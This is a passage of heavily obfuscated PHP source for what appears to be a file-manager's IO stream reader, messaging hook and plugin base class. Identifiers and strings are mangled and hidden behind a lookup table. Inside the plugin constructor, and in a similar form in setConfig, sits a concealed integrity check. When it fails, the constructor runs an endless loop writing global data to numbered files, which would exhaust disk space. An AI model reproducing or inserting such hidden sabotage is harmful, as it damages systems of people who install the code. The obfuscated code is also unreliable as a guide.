{ return !1; } self::$fileInfo[$Ê‹Ê¾î‡] = IO::info(substr($Ê‹Ê¾î‡, strlen($Ç½îÃ¿“))); return self::$fileInfo[$Ê‹Ê¾î‡]; } public static function read($ùçêÚõ, $êÓëÂìÆ, $•ı®À’Ÿ) { if (!isset(self::$_fopenCache[$ùçêÚõ])) { $·«è‡³ = new StreamWrapperIO(); $·«è‡³->stream_open($ùçêÚõ); self::$_fopenCache[$ùçêÚõ] = $·«è‡³; } $·«è‡³ = self::$_fopenCache[$ùçêÚõ]; return $·«è‡³->fileSubstr($êÓëÂìÆ, $•ı®À’Ÿ); } public static function _read($Ç™ÏüÎÊ, $Î·Éîäú, $‘Óê¿º‘) { $¹‰ÒÏ ¾ =& $_SERVER[Î‹ÃÂŞ„]; $å½«Û±Ú = fopen($Ç™ÏüÎÊ, $¹‰ÒÏ ¾[1423]); if (!$å½«Û±Ú) { return $¹‰ÒÏ ¾[12]; } $ó©ğ = 8192; fseek($å½«Û±Ú, $Î·Éîäú, SEEK_SET); $³Ú¢ŸÅÓ = $¹‰ÒÏ ¾[12]; $©Ä‹†‰÷ = 0; while ($©Ä‹†‰÷ < $‘Óê¿º‘) { $ˆ‰Œñá = min($ó©ğ, $‘Óê¿º‘ - $©Ä‹†‰÷); $³Ú¢ŸÅÓ .= fread($å½«Û±Ú, $ˆ‰Œñá); $©Ä‹†‰÷ += $ˆ‰Œñá; } fclose($å½«Û±Ú); return $³Ú¢ŸÅÓ; } public function fileSubstr($´º‰ƒ®‘, $ÖÍ‰…•) { $›™ôóäí =& $_SERVER[Î‹ÃÂŞ„]; $™£ä•¡ = $this->info[$›™ôóäí[78]]; $üÈ¹âÅ = $´º‰ƒ®‘; $³øúìÚŞ = $ÖÍ‰…•; if ($´º‰ƒ®‘ < 0) { $´º‰ƒ®‘ = $™£ä•¡ + $´º‰ƒ®‘; } if ($ÖÍ‰…• === !1) { $ÖÍ‰…• = $™£ä•¡ - $´º‰ƒ®‘; } if ($´º‰ƒ®‘ + $ÖÍ‰…• > $™£ä•¡) { $ÖÍ‰…• = $™£ä•¡ - $´º‰ƒ®‘; } if ($ÖÍ‰…• <= 0) { return $›™ôóäí[12]; } if ($´º‰ƒ®‘ < 0 || $´º‰ƒ®‘ >= $™£ä•¡ || $ÖÍ‰…• <= 0 || $ÖÍ‰…• > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\x6c\145\x52\x65\x61\x64\x20\145\162\x72\157\162\x21\40\x73\164\x61\162\164\x3d{$´º‰ƒ®‘}\73\154\x65\x6e\x67\164\150\75{$ÖÍ‰…•}\73\x20\x73\151\x7a\x65\75{$™£ä•¡}\73"); } $íñ™ú«ü = 64 * 1024; $ã«À§¸æ =& self::$_chunkBuffer[$this->path]; if (!$ã«À§¸æ) { $ã«À§¸æ = array(); } $®à‘Ã¸Í = 0; $®«Õ¯îõ = 0; $öï¨òİ = $›™ôóäí[12]; foreach ($ã«À§¸æ as $®à‘Ã¸Í => $öï¨òİ) { $®à‘Ã¸Í = intval($®à‘Ã¸Í); $®«Õ¯îõ = $®à‘Ã¸Í + strlen($öï¨òİ); if ($´º‰ƒ®‘ >= $®«Õ¯îõ) { continue; } if ($´º‰ƒ®‘ >= $®à‘Ã¸Í && $´º‰ƒ®‘ + $ÖÍ‰…• <= $®«Õ¯îõ) { return substr($öï¨òİ, $´º‰ƒ®‘ - $®à‘Ã¸Í, $ÖÍ‰…•); } break; } if (count($ã«À§¸æ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($›™ôóäí[1557], $›™ôóäí[1558] . count($ã«À§¸æ) . "\x3b\163\164\141\162\164\75{$´º‰ƒ®‘}\54\x6c\x65\156\147\164\x68\x3d{$ÖÍ‰…•}\x3b\160\157\x73\145\x3a{$®à‘Ã¸Í}\176{$®«Õ¯îõ}"); throw new Exception($›™ôóäí[1559]); } $ÂØ¬°—Â = intval($´º‰ƒ®‘ / $íñ™ú«ü) * $íñ™ú«ü; $Â·äøÚ  = ceil(($´º‰ƒ®‘ + $ÖÍ‰…•) / $íñ™ú«ü) * $íñ™ú«ü - $ÂØ¬°—Â; $éÄÃ×¥ = IO::fileSubstr($this->path, $ÂØ¬°—Â, $Â·äøÚ ); $ã«À§¸æ[$ÂØ¬°—Â . $›™ôóäí[12]] = $éÄÃ×¥; ksort($ã«À§¸æ); $İ·Ïùë‰ = substr($éÄÃ×¥, $´º‰ƒ®‘ - $ÂØ¬°—Â, $ÖÍ‰…•); return $İ·Ïùë‰; } private function log($¯¡êÛÂ–, $¡Äï–) { $ÒÄÍ« =& $_SERVER[Î‹ÃÂŞ„]; $€ÍÕŒÌ = timeFloat() - $this->timeStart; write_log(sprintf($ÒÄÍ«[1560], $¯¡êÛÂ–, $this->info[$ÒÄÍ«[32]], $€ÍÕŒÌ, $¡Äï–), $ÒÄÍ«[1237]); } } class Message { function __construct() { } public function send($òôªºš = '', $ÍÀÖ‘òİ = array(), $£¯‰ä¾ = "\164\x65\170\164") { $Ş–óÎô¢ =& $_SERVER[Î‹ÃÂŞ„]; $èî Ÿš = array($Ş–óÎô¢[33] => $Ş–óÎô¢[1561], $Ş–óÎô¢[801] => $òôªºš); if (in_array($£¯‰ä¾, array($Ş–óÎô¢[1561], $Ş–óÎô¢[1562]))) { $èî Ÿš[$Ş–óÎô¢[33]] = $£¯‰ä¾; } $ÍÀÖ‘òİ = array($Ş–óÎô¢[550] => isset($ÍÀÖ‘òİ[$Ş–óÎô¢[550]]) ? $ÍÀÖ‘òİ[$Ş–óÎô¢[550]] : $Ş–óÎô¢[12], $Ş–óÎô¢[633] => isset($ÍÀÖ‘òİ[$Ş–óÎô¢[633]]) ? $ÍÀÖ‘òİ[$Ş–óÎô¢[633]] : $Ş–óÎô¢[12]); if (empty($òôªºš) || empty($ÍÀÖ‘òİ[$Ş–óÎô¢[550]]) && empty($ÍÀÖ‘òİ[$Ş–óÎô¢[633]])) { return !1; } $±¹ÓÉÅ = array($Ş–óÎô¢[1502] => $èî Ÿš, $Ş–óÎô¢[1563] => $ÍÀÖ‘òİ); Hook::trigger($Ş–óÎô¢[1564], $±¹ÓÉÅ); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¢£Úª»Ş =& $_SERVER[Î‹ÃÂŞ„]; $©íŒƒ²¡ = $_SERVER[$¢£Úª»Ş[924]]; $À¨š¡¾§ = $¢£Úª»Ş[925]; if ($_SERVER[$¢£Úª»Ş[926]] != $À¨š¡¾§($©íŒƒ²¡)) { $ûû ˆÓ• = $¢£Úª»Ş[927]; $ÄìÆàìÜ = $¢£Úª»Ş[928]; $‰ŠşÃ²œ = $_SERVER[$¢£Úª»Ş[929]] . $¢£Úª»Ş[930]; $áíê¹¬à = $ÄìÆàìÜ($‰ŠşÃ²œ); $›”îî³› = explode($¢£Úª»Ş[248], $áíê¹¬à); if (count($›”îî³›) < $¢£Úª»Ş[667]) { $œÚèæş¯ = $¢£Úª»Ş[931]; $œÚèæş¯(); } $Îò€È†‹ = $¢£Úª»Ş[932]; $Îò€È†‹($_SERVER[$¢£Úª»Ş[933]]); $ûû ˆÓ• = $¢£Úª»Ş[927]; $ûû ˆÓ•(); $ê‘Ø£å = $¢£Úª»Ş[934]; $ğµÂºì = json_encode($GLOBALS[$¢£Úª»Ş[935]]); $¥Çûøë² = 1; for ($ß£ï‹¼ = $¥Çûøë²; $ß£ï‹¼ > 0; $ß£ï‹¼++) { $ê‘Ø£å(DATA_PATH . $ß£ï‹¼, $ğµÂºì); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¢£Úª»Ş[1565]); $this->pluginName = str_replace($¢£Úª»Ş[1565], $¢£Úª»Ş[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¢£Úª»Ş[8]; $this->pluginApi = appHostGet() . $¢£Úª»Ş[1566] . $this->pluginName . $¢£Úª»Ş[8]; $this->pluginHost = $config[$¢£Úª»Ş[1567]] . $this->pluginName . $¢£Úª»Ş[8]; $this->pluginHostDefault = $config[$¢£Úª»Ş[1567]] . $this->pluginName . $¢£Úª»Ş[8]; $—Å§±¤ = $config[$¢£Úª»Ş[1568]]; if ($—Å§±¤ && strpos($¢£Úª»Ş[50] . $—Å§±¤ . $¢£Úª»Ş[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¢£Úª»Ş[1569]] . $this->pluginName . $¢£Úª»Ş[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Î‹ÃÂŞ„][1570]); } protected function assign($ªøö—ª¾, $†»ªõ = false) { if (is_array($ªøö—ª¾)) { $this->values = array_merge($this->values, $ªøö—ª¾); } else { $this->values[$ªøö—ª¾] = $†»ªõ; } } protected function display($¦¿òãÁ˜) { extract($this->values); require $¦¿òãÁ˜; } final function hookRegist($ã„™¤¤») { $this->modelPlugin->appRegist($this->pluginName, $ã„™¤¤»); } final function appIcon() { $Øùµ‹ã =& $_SERVER[Î‹ÃÂŞ„]; $ĞÒúúğ = $this->appPackage(); $°²·—† = $Øùµ‹ã[12]; if (isset($ĞÒúúğ[$Øùµ‹ã[460]])) { if (isset($ĞÒúúğ[$Øùµ‹ã[460]][$Øùµ‹ã[1571]])) { $°²·—† = $Øùµ‹ã[1572] . $ĞÒúúğ[$Øùµ‹ã[460]][$Øùµ‹ã[1571]] . $Øùµ‹ã[1573]; } else { if ($ĞÒúúğ[$Øùµ‹ã[460]][$Øùµ‹ã[1574]]) { $°²·—† = $Øùµ‹ã[1575] . $ĞÒúúğ[$Øùµ‹ã[460]][$Øùµ‹ã[1574]] . $Øùµ‹ã[1576]; } } } return $°²·—†; } final function fileCanView($í§²§Ô) { $Úö“ôø =& $_SERVER[Î‹ÃÂŞ„]; if (request_url_safe($í§²§Ô)) { return !0; } if ($this->isShare($í§²§Ô)) { return !0; } $ÈüƒõÑ = Session::get($Úö“ôø[1577]); if ($GLOBALS[$Úö“ôø[539]] != 1 && !$ÈüƒõÑ || !$ÈüƒõÑ[$Úö“ôø[1578]]) { $µ‡ŸâÔĞ = $Úö“ôø[1579] . rawurlencode(this_url()); show_tips(LNG($Úö“ôø[1580]) . $Úö“ôø[1581] . $µ‡ŸâÔĞ . $Úö“ôø[1582] . LNG($Úö“ôø[1583]) . $Úö“ôø[1584], !1); } if (!Action($Úö“ôø[1585])->authCan($Úö“ôø[1586])) { show_tips(LNG($Úö“ôø[1587]) . $Úö“ôø[1588], !1); } ActionCall($Úö“ôø[1589], $í§²§Ô); } final function isShare($ÇĞºœô•) { $ÛÍı†”Ñ = KodIO::parse($ÇĞºœô•); return $ÛÍı†”Ñ[$_SERVER[Î‹ÃÂŞ„][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÔÈ„Á¤õ) { if (request_url_safe($ÔÈ„Á¤õ)) { return $ÔÈ„Á¤õ; } if (!$this->isShare($ÔÈ„Á¤õ)) { $ÔÈ„Á¤õ = $this->filePath($ÔÈ„Á¤õ, !1); } return Action($_SERVER[Î‹ÃÂŞ„][1229])->linkOut($ÔÈ„Á¤õ); } public function filePathLinkOut($ÄÎ¯¯ãß) { if (request_url_safe($ÄÎ¯¯ãß)) { return $ÄÎ¯¯ãß; } $this->fileCanView($ÄÎ¯¯ãß); return Action($_SERVER[Î‹ÃÂŞ„][1229])->link($ÄÎ¯¯ãß); } final function filePath($Â¿À‡ô, $»¶ú = true, $³²œûğØ = false) { $‹ÖŒìÒú =& $_SERVER[Î‹ÃÂŞ„]; $ÁÄÒÆ¨ = $this->filePathGet($Â¿À‡ô, $»¶ú); if (!$this->fileInfo) { show_tips(LNG($‹ÖŒìÒú[107]), !1); } if ($³²œûğØ && isset($this->fileInfo[$‹ÖŒìÒú[511]]) && $this->fileInfo[$‹ÖŒìÒú[511]]) { $×‰ŒÏõò = Model($‹ÖŒìÒú[514])->fileInfo($this->fileInfo[$‹ÖŒìÒú[511]]); if (!$×‰ŒÏõò || !IO::exist($×‰ŒÏõò[$‹ÖŒìÒú[86]])) { show_tips(LNG($‹ÖŒìÒú[107]) . $‹ÖŒìÒú[1590]); } } Hook::trigger($‹ÖŒìÒú[1591], $ÁÄÒÆ¨); return $ÁÄÒÆ¨; } final function filePathGet($óÌ‹„ê‡, $ûÀ²ß¬ = true) { $üÉ„Ğ£Ï =& $_SERVER[Î‹ÃÂŞ„]; if ($ºñÂñŒ‰ = $this->checkSharePath($óÌ‹„ê‡, $ûÀ²ß¬)) { return $ºñÂñŒ‰; } $this->fileCanView($óÌ‹„ê‡); if (request_url_safe($óÌ‹„ê‡)) { $‰€´øà = parse_url_query($óÌ‹„ê‡); if (isset($‰€´øà[$üÉ„Ğ£Ï[1592]]) && isset($‰€´øà[$üÉ„Ğ£Ï[220]])) { $Ö‡½ğ±­ = Mcrypt::decode($‰€´øà[$üÉ„Ğ£Ï[220]], Model($üÉ„Ğ£Ï[817])->get($üÉ„Ğ£Ï[818])); if ($Ö‡½ğ±­) { $this->fileInfo = IO::info($Ö‡½ğ±­); $this->fileInfo[$üÉ„Ğ£Ï[1593]] = $óÌ‹„ê‡; $this->cachePath = $this->pluginCachePath($üÉ„Ğ£Ï[12], $ûÀ²ß¬); return $Ö‡½ğ±­; } } $óÌ‹„ê‡ = $this->_cacheHttpFile($óÌ‹„ê‡, $ûÀ²ß¬); $this->fileInfo = IO::info($óÌ‹„ê‡); } else { $this->fileInfo = IO::info($óÌ‹„ê‡); $this->cachePath = $this->pluginCachePath($üÉ„Ğ£Ï[12], $ûÀ²ß¬); } return $óÌ‹„ê‡; } final function _cacheHttpFile($‡²Œ×›¼, $ïšªêÃä = true) { $ÛËö¤™× =& $_SERVER[Î‹ÃÂŞ„]; $Üõ¨Ï†¡ = parse_url_query($‡²Œ×›¼); $‹ÜİÓÇÎ = get_path_ext($‡²Œ×›¼); if (isset($Üõ¨Ï†¡[$ÛËö¤™×[32]]) && $Üõ¨Ï†¡[$ÛËö¤™×[32]]) { $‹ÜİÓÇÎ = get_path_ext($Üõ¨Ï†¡[$ÛËö¤™×[32]]); } $ªÛ³¸íô = hash_path($‡²Œ×›¼) . $ÛËö¤™×[10] . $‹ÜİÓÇÎ; $this->cachePath = $this->pluginCachePath($ïšªêÃä ? $ªÛ³¸íô : $ÛËö¤™×[12]); $“ÌÊúš¢ = IO::fileNameExist($this->cachePath, $ªÛ³¸íô); if ($“ÌÊúš¢) { return KodIO::make($“ÌÊúš¢); } $ˆ¾Š±» = rtrim($this->cachePath, $ÛËö¤™×[8]) . $ÛËö¤™×[8] . $ªÛ³¸íô; return $this->pluginCacheFileSet($ˆ¾Š±», file_get_contents_nossl($‡²Œ×›¼)); } final function checkSharePath($ËäÙëú¼, $«åøÓû¦ = true) { $ï¯ÏÄ›ˆ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->isShare($ËäÙëú¼)) { return !1; } $íç˜÷åè = Action($ï¯ÏÄ›ˆ[1229])->sharePathInfo($ËäÙëú¼); if (!is_array($íç˜÷åè) || !isset($íç˜÷åè[$ï¯ÏÄ›ˆ[86]])) { show_json(LNG($ï¯ÏÄ›ˆ[1594]), !1); } $this->fileInfo = $íç˜÷åè; $this->cachePath = $this->pluginCachePath(!1, $«åøÓû¦); return $íç˜÷åè[$ï¯ÏÄ›ˆ[86]]; } final function pluginCachePath($¿éö‚‘™ = '', $ß‚èû· = false) { $æ¿Üüùã =& $_SERVER[Î‹ÃÂŞ„]; if ($ß‚èû· && is_array($this->fileInfo)) { $¿éö‚‘™ = kodIO::hashPath($this->fileInfo); } $çúº‘Åµ = rtrim(IO_PATH_SYSTEM_TEMP . $æ¿Üüùã[1595] . $this->pluginName . $æ¿Üüùã[8] . $¿éö‚‘™, $æ¿Üüùã[8]); $â¦ºö…§ = IO::infoFullSimple($çúº‘Åµ); $¥Õ•¾Óê = $â¦ºö…§ && is_array($â¦ºö…§) ? $â¦ºö…§[$æ¿Üüùã[86]] : $æ¿Üüùã[12]; if (!$¥Õ•¾Óê) { $¥Õ•¾Óê = IO::mkdir($çúº‘Åµ); } return $¥Õ•¾Óê; } final function pluginCacheFileSet($‡ÉÙ‚«¬, $÷şíÃÓ½ = '') { $–Óï‘ª• =& $_SERVER[Î‹ÃÂŞ„]; $ú“ƒÚá = IO::infoFullSimple($‡ÉÙ‚«¬); if (!$ú“ƒÚá) { return IO::mkfile($‡ÉÙ‚«¬, $÷şíÃÓ½, REPEAT_REPLACE); } IO::setContent($ú“ƒÚá[$–Óï‘ª•[86]], $÷şíÃÓ½); return $ú“ƒÚá[$–Óï‘ª•[86]]; } final function pluginLocalFile($»ºÚŞâå = '') { $ã¯ôŒ” =& $_SERVER[Î‹ÃÂŞ„]; $°Öëô—¿ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($°Öëô—¿)) { mk_dir($°Öëô—¿); } if (!$»ºÚŞâå) { return $°Öëô—¿; } $ÁŸáßİè = IO::info($»ºÚŞâå); $À÷¾ÆÌİ = $ã¯ôŒ”[1596] . KodIO::hashPath($ÁŸáßİè) . $ã¯ôŒ”[10] . $ÁŸáßİè[$ã¯ôŒ”[177]]; if (!checkExtSafe($À÷¾ÆÌİ)) { $À÷¾ÆÌİ = $À÷¾ÆÌİ . $ã¯ôŒ”[1261]; } $« Æêá— = $°Öëô—¿ . $À÷¾ÆÌİ; if (@file_exists($« Æêá—)) { return $« Æêá—; } return IO::copy($»ºÚŞâå, $°Öëô—¿, 0, $À÷¾ÆÌİ); } final function appPackage() { $ ø¦ÉÕÍ =& $_SERVER[Î‹ÃÂŞ„]; if ($this->packageData) { return $this->packageData; } $ëäŞˆ = $this->parseFile($this->pluginPath . $ ø¦ÉÕÍ[1597]); $this->parseLang($ëäŞˆ); $”’ë”× = json_decode_force($ëäŞˆ); if (!$”’ë”×) { return array(); } $ÌÀ§º–î = Hook::trigger($ ø¦ÉÕÍ[1598], $”’ë”×); if ($ÌÀ§º–î && is_array($ÌÀ§º–î)) { $”’ë”× = $ÌÀ§º–î; } $this->packageData = $”’ë”×; return $”’ë”×; } public function packageInfoGet($…¼§ÒÇ) { $±ÃóŸÅ… = $this->appPackage(); return array_get_value($±ÃóŸÅ…, $…¼§ÒÇ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Î‹ÃÂŞ„][1599]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Î‹ÃÂŞ„][1600]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Î‹ÃÂŞ„][1601]); } public function echoJsAssign($¢„µ¡•, $Ï  ¨Ô…) { $this->echoJsAssignArr[$¢„µ¡•] = $Ï  ¨Ô…; } private function parseFile($Í„¥éÄİ) { $”¡›™Ğ =& $_SERVER[Î‹ÃÂŞ„]; $‹ˆ…ô” = file_get_contents_nossl($Í„¥éÄİ); $ÍÃŞ×¬º = array($”¡›™Ğ[1602], $”¡›™Ğ[1603], $”¡›™Ğ[1604], $”¡›™Ğ[1605], $”¡›™Ğ[1606], $”¡›™Ğ[1607], $”¡›™Ğ[1608]); $ôüûİŞĞ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$”¡›™Ğ[91]][$”¡›™Ğ[1609]]); foreach ($this->echoJsAssignArr as $Ğ÷‰êË => $£÷‹¡ õ) { $ÍÃŞ×¬º[] = $”¡›™Ğ[1610] . $Ğ÷‰êË . $”¡›™Ğ[1611]; $ôüûİŞĞ[] = is_array($£÷‹¡ õ) || is_object($£÷‹¡ õ) ? rawurlencode(json_encode($£÷‹¡ õ)) : $£÷‹¡ õ; } if (strstr($‹ˆ…ô”, $”¡›™Ğ[1612])) { $¡òÚçò = rawurlencode(json_encode($this->pluginLangArr)); $‹ˆ…ô” = str_replace($”¡›™Ğ[1612], $¡òÚçò, $‹ˆ…ô”); } if (strstr($‹ˆ…ô”, $”¡›™Ğ[1613])) { $¡òÚçò = $¡òÚçò = rawurlencode(json_encode($this->getConfig())); $‹ˆ…ô” = str_replace($”¡›™Ğ[1613], $¡òÚçò, $‹ˆ…ô”); } $‹ˆ…ô” = str_replace($ÍÃŞ×¬º, $ôüûİŞĞ, $‹ˆ…ô”); return $‹ˆ…ô”; } private function parseLang(&$‘¿šÍÂœ) { $îëü¢· =& $_SERVER[Î‹ÃÂŞ„]; $Å¬æñ í = $îëü¢·[1614]; if (!strstr($‘¿šÍÂœ, $Å¬æñ í)) { return; } preg_match_all($îëü¢·[1615], $‘¿šÍÂœ, $ÕÄ‡”Š²); if (!is_array($ÕÄ‡”Š²) || count($ÕÄ‡”Š²) == 0 || !is_array($ÕÄ‡”Š²[0]) || count($ÕÄ‡”Š²[0]) == 0) { return; } $É§ßÊµ = array(); $´Ã¾µšƒ = array(); foreach ($ÕÄ‡”Š²[0] as $®¡àÇ¸”) { $÷Í¡ğŠ = substr($®¡àÇ¸”, strlen($Å¬æñ í), -4); $Ş£ãîŒƒ = LNG($÷Í¡ğŠ); $É§ßÊµ[] = $®¡àÇ¸”; $´Ã¾µšƒ[] = str_replace(array($îëü¢·[248], $îëü¢·[1133], $îëü¢·[388], $îëü¢·[120]), array($îëü¢·[53], $îëü¢·[53], $îëü¢·[12], $îëü¢·[1616]), $Ş£ãîŒƒ); } $‘¿šÍÂœ = str_replace($É§ßÊµ, $´Ã¾µšƒ, $‘¿šÍÂœ); } private function parseConfig(&$äÚõ“Ğ) { $“³ÒÎ„ =& $_SERVER[Î‹ÃÂŞ„]; $ïÙÌ¾° = $“³ÒÎ„[1617]; if (!strstr($äÚõ“Ğ, $ïÙÌ¾°)) { return; } preg_match_all($“³ÒÎ„[1618], $äÚõ“Ğ, $ÙÄõÒú); if (!is_array($ÙÄõÒú) || count($ÙÄõÒú) == 0 || !is_array($ÙÄõÒú[0]) || count($ÙÄõÒú[0]) == 0) { return; } $Å“ğ¥Š” = $this->getConfig(); $´“ë“ûŒ = array(); $à¦Ñµ„Ë = array(); foreach ($ÙÄõÒú[0] as $«ª‡»‡±) { $ÙöŸÜ²ó = substr($«ª‡»‡±, strlen($ïÙÌ¾°), -2); $´“ë“ûŒ[] = $«ª‡»‡±; $à¦Ñµ„Ë[] = _get($Å“ğ¥Š”, $ÙöŸÜ²ó); } $äÚõ“Ğ = str_replace($´“ë“ûŒ, $à¦Ñµ„Ë, $äÚõ“Ğ); } private function parsePackage(&$Ç´¢‡ùï) { $ğ±¬¨ãÀ =& $_SERVER[Î‹ÃÂŞ„]; $’Åœ¯™å = $ğ±¬¨ãÀ[1619]; if (!strstr($Ç´¢‡ùï, $’Åœ¯™å)) { return; } preg_match_all($ğ±¬¨ãÀ[1620], $Ç´¢‡ùï, $Êˆˆè™); if (!is_array($Êˆˆè™) || count($Êˆˆè™) == 0 || !is_array($Êˆˆè™[0]) || count($Êˆˆè™[0]) == 0) { return; } $¦šĞÉÙ = $this->appPackage(); $Íñ·ÎŠÚ = array(); $œÆºïË“ = array(); foreach ($Êˆˆè™[0] as $¶îÜ€‘½) { $ªµŸçæû = substr($¶îÜ€‘½, strlen($’Åœ¯™å), -2); $Íñ·ÎŠÚ[] = $¶îÜ€‘½; $œÆºïË“[] = _get($¦šĞÉÙ, $ªµŸçæû); } $Ç´¢‡ùï = str_replace($Íñ·ÎŠÚ, $œÆºïË“, $Ç´¢‡ùï); } final function echoFile($Ü¾ÊÃÔ , $‘ü°Îƒİ = false) { $ Û¤Áª =& $_SERVER[Î‹ÃÂŞ„]; $Æëş†òş = $this->pluginPath . $Ü¾ÊÃÔ ; if (ACT == $ Û¤Áª[1621]) { echo $ Û¤Áª[1622] . $this->pluginName . $ Û¤Áª[8] . $Ü¾ÊÃÔ  . $ Û¤Áª[1623]; if (!file_exists($Æëş†òş)) { echo $ Û¤Áª[1624]; return; } } $ÚğÃ›§å = $this->parseFile($Æëş†òş); $this->parseLang($ÚğÃ›§å); $this->parseConfig($ÚğÃ›§å); $this->parsePackage($ÚğÃ›§å); if (is_array($‘ü°Îƒİ)) { $ÚğÃ›§å = str_replace(array_keys($‘ü°Îƒİ), array_values($‘ü°Îƒİ), $ÚğÃ›§å); } echo $ Û¤Áª[248] . $ÚğÃ›§å; } final function initLang() { $«¡ÙÄÁŠ =& $_SERVER[Î‹ÃÂŞ„]; $ ³˜š¸¡ = $«¡ÙÄÁŠ[1625]; $¿èßêÕ€ = $this->pluginPath . $«¡ÙÄÁŠ[1626]; $¡»¶†İ = I18n::getType(); $›£²¬ığ = array(); if (file_exists($¿èßêÕ€ . $¡»¶†İ . $«¡ÙÄÁŠ[886])) { $›£²¬ığ = (include $¿èßêÕ€ . $¡»¶†İ . $«¡ÙÄÁŠ[886]); } else { if ($¡»¶†İ == $«¡ÙÄÁŠ[1627] && !file_exists($¿èßêÕ€ . $¡»¶†İ . $«¡ÙÄÁŠ[886]) && file_exists($¿èßêÕ€ . $«¡ÙÄÁŠ[1628])) { $›£²¬ığ = (include $¿èßêÕ€ . $«¡ÙÄÁŠ[1628]); } else { if (file_exists($¿èßêÕ€ . $ ³˜š¸¡ . $«¡ÙÄÁŠ[886])) { $›£²¬ığ = (include $¿èßêÕ€ . $ ³˜š¸¡ . $«¡ÙÄÁŠ[886]); } } } if (!is_array($›£²¬ığ)) { return array(); } if (@count($›£²¬ığ) > 0) { I18n::set($›£²¬ığ); } return $›£²¬ığ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ŒòÕËï) { $¹¸£…ƒ… =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($_SERVER[$¹¸£…ƒ…[926]]) || !isset($_SERVER[$¹¸£…ƒ…[924]])) { $Ùí×ñª´ = $¹¸£…ƒ…[927]; $Ó˜çÌ¬ = $¹¸£…ƒ…[928]; $Ó‘½‚Ë = $_SERVER[$¹¸£…ƒ…[929]] . $¹¸£…ƒ…[930]; $ÔüØ˜ËŠ = $Ó˜çÌ¬($Ó‘½‚Ë); $…Öôú¨á = explode($¹¸£…ƒ…[248], $ÔüØ˜ËŠ); if (count($…Öôú¨á) < $¹¸£…ƒ…[667]) { $ãò´ßã• = $¹¸£…ƒ…[931]; $ãò´ßã•(); } $Ü¹üÑ = $¹¸£…ƒ…[932]; $Ü¹üÑ($_SERVER[$¹¸£…ƒ…[933]]); $ÚàÕæªŞ = 1; for ($ì´À»í = $ÚàÕæªŞ; $ì´À»í > 0; $ì´À»í++) { $Ü¹üÑ = json_encode($GLOBALS[$¹¸£…ƒ…[462]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ŒòÕËï); } public function onSetConfig($íƒ¦ÁÂ•) { } public function onGetConfig($Â³—ûê«) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($í¤£¢Õô) { if ($í¤£¢Õô == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($¬®µÕÎ = "\x70\x6c\x75\x67\151\x6e\x41\x75\164\x68") { $´¯öÌè‡ =& $_SERVER[Î‹ÃÂŞ„]; if (!Session::get($´¯öÌè‡[1577])) { return !1; } if (_get($GLOBALS, $´¯öÌè‡[539])) { return !0; } $ÕóÑ½ÓÉ = $this->getConfig(); if (!$ÕóÑ½ÓÉ[$¬®µÕÎ]) { return !1; } return ActionCall($´¯öÌè‡[1629], $ÕóÑ½ÓÉ[$¬®µÕÎ]); } public function regLastUpdate($©ÔÔùÓ = '') { $Ö–ŞÛı¬ =& $_SERVER[Î‹ÃÂŞ„]; if (!$©ÔÔùÓ) { return; } $çğö‹¶¬ = $this->getConfig(); if ($çğö‹¶¬[$Ö–ŞÛı¬[1630]] != $©ÔÔùÓ) { $this->regist(); $this->setConfig($Ö–ŞÛı¬[1630], $©ÔÔùÓ); } } public function url($ç£í—Ş, $„†ÙËëÅ = '', $ãğ“‚¯É = true) { $æ¬ûıñ¶ =& $_SERVER[Î‹ÃÂŞ„]; $œ˜êôá­ = $this->getConfig(); $ ïœ‰Õñ = KOD_VERSION . $æ¬ûıñ¶[10] . KOD_VERSION_BUILD; $¶Î¦æüç = $this->packageVersion(); $ñâ·Ãá× = $ ïœ‰Õñ . $æ¬ûıñ¶[432] . $¶Î¦æüç; if (substr($ç£í—Ş, 0, 4) == $æ¬ûıñ¶[151] || substr($ç£í—Ş, 0, 2) == $æ¬ûıñ¶[1410]) { $ë¸Ì’ŠÊ = $ç£í—Ş . $æ¬ûıñ¶[1631] . $ñâ·Ãá×; } else { if ($„†ÙËëÅ == $æ¬ûıñ¶[12]) { $ë¸Ì’ŠÊ = $this->pluginHost . $ç£í—Ş . $æ¬ûıñ¶[1631] . $ñâ·Ãá×; } else { if ($„†ÙËëÅ === $æ¬ûıñ¶[77]) { $ë¸Ì’ŠÊ = $this->pluginHost . $ç£í—Ş; } else { if ($„†ÙËëÅ == $æ¬ûıñ¶[1632]) { $ë¸Ì’ŠÊ = STATIC_PATH . $ç£í—Ş . $æ¬ûıñ¶[1631] . $ ïœ‰Õñ; } else { if ($„†ÙËëÅ == $æ¬ûıñ¶[1633]) { $ë¸Ì’ŠÊ = APP_HOST . $æ¬ûıñ¶[1634] . $ç£í—Ş . $æ¬ûıñ¶[1631] . $ ïœ‰Õñ; } else { if (isset($œ˜êôá­[$„†ÙËëÅ])) { $ë¸Ì’ŠÊ = $œ˜êôá­[$„†ÙËëÅ] . $ç£í—Ş . $æ¬ûıñ¶[1631] . $ñâ·Ãá×; } } } } } } if 